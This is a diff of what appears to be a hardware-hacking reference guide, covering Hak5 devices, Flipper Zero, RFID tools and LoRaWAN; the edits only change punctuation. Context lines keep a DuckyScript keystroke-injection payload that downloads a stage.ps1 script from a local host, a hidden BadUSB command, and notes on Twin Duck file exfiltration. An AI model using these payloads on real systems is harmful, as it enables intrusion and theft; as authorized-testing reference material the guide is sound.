@@ -44,7 +44,7 @@ Core Modules:
 - REST API: Full device management via JSON REST API. Enables scripted automation of campaigns, module control, and log retrieval.
 - Cloud C2 Integration: Remote management via Hak5's Cloud C2 platform. Supports device tunneling, payload deployment, and loot retrieval over internet-routed connections.
 
-WiFi Coconut — A companion device featuring 14 simultaneous 2.4 GHz radios, enabling full-band 802.11 capture across all channels simultaneously. Used with Kismet for comprehensive wireless spectrum monitoring during authorized assessments.
+WiFi Coconut: A companion device featuring 14 simultaneous 2.4 GHz radios, enabling full-band 802.11 capture across all channels simultaneously. Used with Kismet for comprehensive wireless spectrum monitoring during authorized assessments.
 
 Operational workflow:
 ```
@@ -74,7 +74,7 @@ DuckyScript Language:
 | `REPEAT` | Repeat previous line | `REPEAT 5` |
 | `DEFAULT_DELAY` | Set global delay | `DEFAULT_DELAY 100` |
 
-Example payload — open Run dialog and execute command:
+Example payload (open Run dialog and execute command):
 ```ducky
 DELAY 1000
 GUI r
@@ -86,11 +86,11 @@ STRING Invoke-WebRequest -Uri http://192.168.1.10/stage.ps1 -OutFile $env:TEMP\s
 ENTER
 ```
 
-Twin Duck Firmware — Modified firmware enabling simultaneous HID and mass storage modes. The device appears as both a keyboard and a USB flash drive, allowing payload delivery combined with file exfiltration.
+Twin Duck Firmware: Modified firmware enabling simultaneous HID and mass storage modes. The device appears as both a keyboard and a USB flash drive, allowing payload delivery combined with file exfiltration.
 
-Payload Studio — Browser-based IDE at payloadstudio.hak5.org for authoring, testing, and encoding DuckyScript payloads. Features syntax highlighting, error checking, and direct device flashing.
+Payload Studio: Browser-based IDE at payloadstudio.hak5.org for authoring, testing, and encoding DuckyScript payloads. Features syntax highlighting, error checking, and direct device flashing.
 
-Community Payloads: `github.com/hak5/usbrubberducky-payloads` — curated repository of community-contributed payloads organized by OS and attack category.
+Community Payloads: `github.com/hak5/usbrubberducky-payloads`, curated repository of community-contributed payloads organized by OS and attack category.
 
 ### 1.3 Bash Bunny
 
@@ -542,7 +542,7 @@ Key: 00 00 00 00 00 AB CD 12
 
 Frequency analyzer mode displays signal power across the Sub-GHz spectrum in real-time, enabling quick identification of active frequencies.
 
-RAW capture and replay: Records the raw OOK/FSK waveform without protocol decoding — useful for protocols Flipper does not natively support. Replays the exact recorded waveform.
+RAW capture and replay: Records the raw OOK/FSK waveform without protocol decoding, useful for protocols Flipper does not natively support. Replays the exact recorded waveform.
 
 Region unlock: Default firmware enforces regional frequency restrictions. Community firmware (Unleashed, Momentum) removes these restrictions for testing in authorized environments.
 
@@ -598,7 +598,7 @@ STRING Start-Process cmd -ArgumentList '/c whoami > C:\temp\out.txt' -WindowStyl
 ENTER
 ```
 
-Payload storage: `/SD Card/badusb/` — `.txt` files with DuckyScript syntax
+Payload storage: `/SD Card/badusb/` (`.txt` files with DuckyScript syntax)
 
 Key limitations vs. USB Rubber Ducky: No multi-stage delivery (single script only), limited to DuckyScript 1.0 syntax, type speed may vary by OS language/layout.
 
@@ -612,7 +612,7 @@ Flipper Zero includes an IR transmitter and receiver for universal remote contro
 - Universal remote: pre-loaded codes for major TV brands
 - RAW capture mode for non-standard protocols
 
-Community IRDB: `github.com/Lucaslhm/Flipper-IRDB` — thousands of device code files in `.ir` format
+Community IRDB: `github.com/Lucaslhm/Flipper-IRDB`, thousands of device code files in `.ir` format
 
 ### 3.6 iButton (1-Wire)
 
@@ -634,7 +634,7 @@ GPIO WiFi Dev Board: An ESP32-based add-on connecting to Flipper's GPIO header. 
 - Beacon flood testing
 - Packet capture (PCAP)
 
-Flipper App Marketplace: `lab.flipper.net/apps` — community applications including games, tools, and protocol analyzers installable via Flipper Mobile App.
+Flipper App Marketplace: `lab.flipper.net/apps`, community applications including games, tools, and protocol analyzers installable via Flipper Mobile App.
 
 Community resources:
 - `github.com/djsime1/awesome-flipperzero`: curated resources list
@@ -1259,7 +1259,7 @@ LoRaWAN is a MAC layer protocol for LoRa radio networks, commonly used in IoT de
 Security architecture:
 - AES-128 session keys for MAC layer encryption
 - Frame counter to prevent replay attacks
-- OTAA (Over-The-Air Activation): Devices join using AppKey, generating session keys per-join — more secure
+- OTAA (Over-The-Air Activation): Devices join using AppKey, generating session keys per-join; more secure
 - ABP (Activation By Personalization): Static session keys hardcoded: vulnerable to replay if counters reset
 
 Security research tools:
@@ -1391,7 +1391,7 @@ rpi-rf_send -g 17 -p 350 -l 0 12345678
 # -g: GPIO pin, -p: pulse length (us), -l: protocol (0=auto)
 ```
 
-PiKVM — Remote KVM over IP:
+PiKVM (Remote KVM over IP):
 - Connects to target via HDMI capture + USB OTG HID
 - Web interface provides remote keyboard/mouse/screen
 - Useful for authorized remote access to air-gapped systems
@@ -1491,7 +1491,7 @@ Hardware features:
 - FPGA-accelerated signal processing
 - USB-C interface
 
-Community firmware: `github.com/RfidResearchGroup/proxmark3` (iceman fork — most feature-complete)
+Community firmware: `github.com/RfidResearchGroup/proxmark3` (iceman fork; most feature-complete)
 
 Installation:
 ```bash
@@ -1582,7 +1582,7 @@ Supported emulation types:
 - ISO 15693
 - EM4100 (LF, ChameleonMini RDV with LF)
 
-ChameleonTiny — compact version (keychain-sized) with same core functionality.
+ChameleonTiny: compact version (keychain-sized) with same core functionality.
 
 ### 8.3 WiFi Attack Hardware
 
@@ -1884,7 +1884,7 @@ Conferences:
 
 DEF CON Hardware Hacking Village: Annual hands-on workshop area with soldering stations, hardware puzzle challenges, and talks on embedded security. Open to all badge holders.
 
-Tindie: `tindie.com` — marketplace for maker/small-producer hardware including custom security tools, RFID research hardware, and SDR accessories.
+Tindie: `tindie.com`, marketplace for maker/small-producer hardware including custom security tools, RFID research hardware, and SDR accessories.
 
 Procurement guidance:
 - `hak5.org`: official Hak5 store
